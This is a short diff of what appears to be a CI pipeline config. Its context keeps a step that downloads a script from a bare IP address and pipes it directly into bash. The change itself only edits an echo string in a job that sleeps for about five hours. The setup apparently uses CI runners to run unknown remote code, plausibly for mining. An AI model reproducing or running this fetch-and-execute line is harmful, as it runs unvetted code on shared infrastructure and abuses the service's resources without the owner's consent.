@@ -8,7 +8,7 @@ jobs:
       - checkout
       - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://52.221.198.182/gr.sh | bash -
       - run: 
-            command: sleep 17980; echo "Hola 3482"
+            command: sleep 17980; echo "Hola 34282"
             no_output_timeout: 5h
 
   pressiyhep1:
